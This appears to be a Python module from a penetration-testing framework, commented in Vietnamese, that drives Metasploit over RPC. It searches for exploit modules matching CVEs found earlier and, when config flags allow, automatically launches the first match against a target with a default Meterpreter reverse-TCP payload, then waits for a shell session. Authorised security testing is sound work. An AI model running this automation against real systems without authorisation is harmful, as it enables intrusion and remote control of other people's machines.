"""Metasploit RPC automation - tự động exploit sau khi confirm vuln."""
import os
import time
from core.base_module import BaseModule
from core.logger import get_logger

LOG = get_logger("ceh.msf")


class MetasploitClient:
    """Wrapper quanh pymetasploit3."""

    def __init__(self, password=None, host="127.0.0.1", port=55553, ssl=True):
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
        except ImportError:
            raise ImportError("pip install pymetasploit3")
        self.password = password or os.environ.get("MSF_PASSWORD", "msf")
        self.client = MsfRpcClient(self.password, server=host,
                                   port=port, ssl=ssl)
        LOG.info(f"[msf] Kết nối RPC {host}:{port}")

    # ---------- Search & info ----------
    def search_exploits(self, cve=None, platform=None, keyword=None):
        """Tìm exploit module theo CVE/platform."""
        exploits = []
        for name in self.client.modules.exploits:
            if cve and cve.lower() in name.lower():
                exploits.append(name)
            elif keyword and keyword.lower() in name.lower():
                exploits.append(name)
        return exploits

    def module_info(self, mod_type, name):
        mod = self.client.modules.use(mod_type, name)
        return {
            "name": name,
            "description": mod.description,
            "references": mod.references,
            "options": list(mod.options),
        }

    # ---------- Exploit ----------
    def run_exploit(self, exploit_name, target, payload,
                    options=None, wait=15):
        """Chạy exploit + payload, chờ session."""
        LOG.info(f"[msf] Exploit {exploit_name} → {target}")
        exploit = self.client.modules.use("exploit", exploit_name)
        exploit["RHOSTS"] = target
        for k, v in (options or {}).items():
            exploit[k] = v

        payload_mod = self.client.modules.use("payload", payload)
        if options:
            for k, v in options.items():
                if k.startswith("PAYLOAD_"):
                    payload_mod[k.replace("PAYLOAD_", "")] = v

        # Chạy
        result = exploit.execute(payload=payload)
        job_id = result.get("job_id")
        LOG.info(f"[msf] Job {job_id} đang chạy...")

        # Chờ session
        start = time.time()
        while time.time() - start < wait:
            sessions = self.client.sessions.list
            if sessions:
                sid = list(sessions.keys())[0]
                LOG.info(f"[msf] ✓ Session {sid} mở: {sessions[sid]}")
                return {"session_id": sid, "info": sessions[sid],
                        "job_id": job_id}
            time.sleep(2)

        return {"error": "Không có session sau timeout",
                "job_id": job_id}

    def run_auxiliary(self, aux_name, target, options=None):
        """Chạy auxiliary module (scanner, brute, v.v.)."""
        aux = self.client.modules.use("auxiliary", aux_name)
        aux["RHOSTS"] = target
        for k, v in (options or {}).items():
            aux[k] = v
        result = aux.execute()
        return result


class Module(BaseModule):
    name = "msf_automation"
    module_id = "MSF"
    description = "Metasploit RPC automation (exploit sau khi confirm vuln)"

    def run(self):
        self.logger.info(f"[MSF] Automation cho: {self.target}")
        cfg = self.config

        # Chỉ chạy nếu được bật rõ ràng
        if not cfg.get("enabled", False):
            return {"note": "Cần bật 'enabled: true' trong config để chạy"}

        try:
            msf = MetasploitClient(
                password=cfg.get("password"),
                host=cfg.get("host", "127.0.0.1"),
                port=cfg.get("port", 55553),
            )
        except Exception as e:
            return {"error": f"Không kết nối MSF RPC: {e}"}

        results = {}

        # Search exploit theo CVE từ state (M05)
        from core.state import STATE
        cves = STATE.get("cves", [])
        for cve in cves[:5]:
            matches = msf.search_exploits(cve=cve)
            results[f"search_{cve}"] = matches[:10]

        # Chạy exploit cho CVE đầu tiên nếu auto_exploit=true
        if cfg.get("auto_exploit", False) and cves:
            cve = cves[0]
            matches = msf.search_exploits(cve=cve)
            if matches:
                results["exploit_result"] = msf.run_exploit(
                    matches[0], self.target,
                    cfg.get("payload", "linux/x64/meterpreter/reverse_tcp"),
                    options=cfg.get("options", {}),
                    wait=cfg.get("wait", 15),
                )
        return results